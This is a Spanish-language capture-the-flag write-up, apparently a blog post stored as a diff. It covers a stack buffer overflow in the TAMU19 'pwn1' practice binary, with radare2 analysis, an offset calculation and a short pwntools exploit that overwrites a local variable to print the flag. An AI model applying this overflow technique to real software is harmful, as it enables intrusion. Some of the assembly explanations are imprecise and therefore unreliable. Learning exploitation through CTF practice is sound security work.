@@ -1,0 +1,115 @@
+I"L$<p class="lead">Tenemos un BoF stack based donde lo usaremos para sobrescribir el valor de una variable</p>
+
+<p>El binario lo pueden descargar con:</p>
+
+<p><code class="language-plaintext highlighter-rouge">wget https://github.com/guyinatuxedo/nightmare/raw/master/modules/04-bof_variable/tamu19_pwn1/pwn1</code></p>
+
+<h2 id="analisis">Analisis</h2>
+
+<p>El binario cuenta con las siguientes protecciones:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols	  No	0		2		pwn1
+</code></pre></div></div>
+<p>No tienec Canary asi que podemos intentar un buffer overflow, sin embargo tiene NX, asi que no podemos ejecutar una shellcode.</p>
+
+<p>Aqui intente ejecutar el binario pasandole lo que sea y luego tratando de ocasionar un buffer overflow:</p>
+
+<p><img src="/assets/img/tamu-pwn1/binario1.png" alt="" /></p>
+
+<p>Pero de ninguna forma funciono, asi que vamos a ver que esta pasando, para el reversing usare radare2</p>
+
+<p>Y miren, aqui tenemos la funcion que recibe nuestro input:</p>
+
+<p><img src="/assets/img/tamu-pwn1/radare1.png" alt="" /></p>
+
+<p>Lo mas descatable son las instrucciones:</p>
+
+<ul>
+  <li>
+    <p>lea eax, [ebx - 0x159f]: Que lo que esta haciendo es cargar la direccion de memoria que esta contenida en <code class="language-plaintext highlighter-rouge">ebx-0x159f</code>, esto significa que se está leyendo la dirección de memoria contenida en la ubicación de memoria apuntada por ebx-0x159f y luego cargando esa dirección en el registro eax. y lo que tiene esa direccion de memoria es nuestro input</p>
+  </li>
+  <li>
+    <p>push eax: Luego nuestro input lo mete al stack</p>
+  </li>
+  <li>
+    <p>lea eax, [ s1]: Esto hace lo mismo que <code class="language-plaintext highlighter-rouge">lea eax, [ebx - 0x159f]</code> pero ahora hay que tomar en cuenta que lo esta haciendo con lo que tiene la variable <code class="language-plaintext highlighter-rouge">s1</code>, esta se esta declarando como <code class="language-plaintext highlighter-rouge">var char *s1 @ ebp-0x3b</code> y esta 56 bytes por debajo del <code class="language-plaintext highlighter-rouge">EBP</code></p>
+  </li>
+</ul>
+
+<p>Despues tenemos una comparacion que es:</p>
+
+<p><img src="/assets/img/tamu-pwn1/radare2.png" alt="" /></p>
+
+<p>Lo que hace primero con <code class="language-plaintext highlighter-rouge">add</code> es sumarle 16 bytes al <code class="language-plaintext highlighter-rouge">ESP</code>, esto con el fin para ajustar la posicion del <code class="language-plaintext highlighter-rouge">ESP</code> en el stack. Despues con <code class="language-plaintext highlighter-rouge">test</code>se hace una operacion AND bit a bit entre lo que le metimos como input y lo que tiene <code class="language-plaintext highlighter-rouge">s1</code>, y esto sirve ya que despues tenemos la intruccion <code class="language-plaintext highlighter-rouge">je</code> que significa <code class="language-plaintext highlighter-rouge">salta si es igual</code>, asi que si el input y <code class="language-plaintext highlighter-rouge">si</code> son iguales, la flag <code class="language-plaintext highlighter-rouge">ZF</code> se establece en 1 y salta a la direccion <code class="language-plaintext highlighter-rouge">0x5655582f</code> y si no, la <code class="language-plaintext highlighter-rouge">ZF</code> se establace en 0 y en este caso lo que pasa es que el programa se detiene como se puede ver aqui en esta imaguen que pinte jiji:</p>
+
+<p><img src="/assets/img/tamu-pwn1/radare3.gif" alt="" /></p>
+
+<p>Si son iguales el programa sigue con la ejecucion desde la funcion <code class="language-plaintext highlighter-rouge">0x5655582f</code> (color amarillo), y si no simplemente hace un exit y se detiene (color rojo).</p>
+
+<p>Despues en el programa tenemos otro input, pero es exactamente lo mismo que el que acabe de explicar, solo que la pregunta seria… ¿Cual es el valor de <code class="language-plaintext highlighter-rouge">s1</code> con el que nuestro input se esta comparando?, y lo que se me ocurrio a mi fue: si la variable <code class="language-plaintext highlighter-rouge">s1</code> se esta declarando como una variable global, entonces en la seccion .rodata de el binario debe de estar, esto es por que en .rodata se encuentran las variables inicializadas globalmente pero de solo lectura, entonces mostre la seccion .rodata con el comando <code class="language-plaintext highlighter-rouge">iz</code>:</p>
+
+<p><img src="/assets/img/tamu-pwn1/radare4.png" alt="" /></p>
+
+<p>Y wow, ahora sabemos que nuestros inputs se estan comparando con <code class="language-plaintext highlighter-rouge">Sir Lancelot of Camelot</code> y <code class="language-plaintext highlighter-rouge">To seek the Holy Grail</code>, y wow, esto es completamente inutil ya que no nos sirve para nada jaja, lo que en realidad nos sirve es lo que sigue y es donde dice:</p>
+
+<p><code class="language-plaintext highlighter-rouge">What... is my secret?</code></p>
+
+<p>Y aqui es otro input y su codigo en emsamblador es:</p>
+
+<p><img src="/assets/img/tamu-pwn1/radare5.png" alt="" /></p>
+
+<p>Esto es un mas facil de analizar, simplemente compara lo que se almacena en<code class="language-plaintext highlighter-rouge">var_10h</code> con el valor <code class="language-plaintext highlighter-rouge">0xdea110c8</code> y si son iguales manda a llama a la funcion <code class="language-plaintext highlighter-rouge">sym.print_flag</code>, que basicamente es la que imprime la flag.</p>
+
+<p>Y para explotarlo, tenemos que hacer es sobreescribir el contenido de <code class="language-plaintext highlighter-rouge">var_10</code> usando <code class="language-plaintext highlighter-rouge">gets</code>, pero no es tan obvio como parece, tenemos que tomar en cuenta en donde se ubican dos variables: <code class="language-plaintext highlighter-rouge">var_10</code> y <code class="language-plaintext highlighter-rouge">s</code>, esto con el fin de saber el desplazamiento entre esas dos y saber cuantos bytes hay que meter.</p>
+
+<p>Para saber donde esta <code class="language-plaintext highlighter-rouge">var_10</code> vemos la declaracion de la variable:</p>
+
+<p><code class="language-plaintext highlighter-rouge">var uint32_t var_10h @ ebp-0x10</code></p>
+
+<p>Esta esta 0x10 por debajo del EBP, es decir, 16 bytes.</p>
+
+<p>Y para <code class="language-plaintext highlighter-rouge">s1</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">var char *s1 @ ebp-0x3b</code></p>
+
+<p>Esta a 0x3b, es decir, 59 bytes</p>
+
+<p>Entonces tenemos un desplazamiento de 59 - 16 = 43, asi que debemos de escribir 43 bytes antes de sobreescribir la variable</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./pwn1'</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">43</span> <span class="c1">#Esto es el padding
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdea110c8</span><span class="p">)</span> <span class="c1">#el valor por la cual la vamos a sobreescribir
+</span>
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"Sir Lancelot of Camelot"</span><span class="p">)</span>
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"To seek the Holy Grail."</span><span class="p">)</span>
+
+<span class="n">target</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">target</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Y listo</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py
+
+[+] Starting local process './pwn1': pid 26329
+/home/c4rta/Downloads/exploit.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  target.sendline("Sir Lancelot of Camelot")
+/home/c4rta/Downloads/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  target.sendline("To seek the Holy Grail.")
+[*] Switching to interactive mode
+Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
+What... is your name?
+What... is your quest?
+What... is my secret?
+Right. Off you go.
+flag{g0ttem_b0yz} --&gt; la flag
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
